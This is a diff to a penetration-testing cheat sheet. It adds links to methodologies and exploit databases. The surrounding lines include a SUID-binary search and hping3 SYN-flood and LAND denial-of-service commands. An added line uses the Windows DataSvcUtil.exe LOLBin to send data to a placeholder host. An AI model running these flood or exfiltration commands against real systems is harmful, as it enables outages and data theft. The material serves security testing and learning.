@@ -5,12 +5,16 @@
 - https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
 - https://snovvcrash.rocks/cheatsheets/
 - https://hausec.com/pentesting-cheatsheet/
-- http://www.vulnerabilityassessment.co.uk/Penetration%20Test.html
-- http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines
+
 - https://github.com/Orange-Cyberdefense/arsenal
 - https://github.com/enaqx/awesome-pentest
 - https://github.com/kyawthiha7/pentest-methodology
 - https://prune2000.github.io/tools/pentest/
+
+- http://www.vulnerabilityassessment.co.uk/Penetration%20Test.html
+    - http://www.vulnerabilityassessment.co.uk/Framework.png
+- https://www.isecom.org/OSSTMM.3.pdf
+- http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines
 
 # vulnerability databases
 
@@ -18,6 +22,8 @@
 - [SG TCP/IP Ports Database](https://www.speedguide.net/ports.php)
 - [Exploit Database \- Exploits for Penetration Testers, Researchers, and Ethical Hackers](https://www.exploit-db.com/)
 - [💀 Sploitus \| Exploit & Hacktool Search Engine](https://sploitus.com/)
+- [CVE security vulnerability database\. Security vulnerabilities, exploits, references and more](https://www.cvedetails.com/)
+- [Exploit Files \- Packet Storm](https://packetstormsecurity.com/files/tags/exploit)
 
 # racing, race-condition
 
@@ -162,6 +168,10 @@ find / -perm -u=s -type f 2>/dev/null
     hping3 -V -c 1000 -d 100 -p 8080 -S -- flood 1.2.3.4
     # LAND attack
     hping3 -V -c 1000 -d 100 -p 8080 -s 18080 -S -k -a 1.2.3.4 1.2.3.4
+    ```
+    ```ps1
+    # https://debugactiveprocess.medium.com/data-exfiltration-with-lolbins-20e5e9c1ed8e
+    C:\Windows\Microsoft.NET\Framework64\v3.5\DataSvcUtil.exe /out:C:\\temp\\foo /uri:https://foo?$data
     ```
 - URI scheme
     - file, ftp, zlib, data, glob, phar, ssh2, rar, ogg, ftps, compress.zlib, compress.bzip2, zip
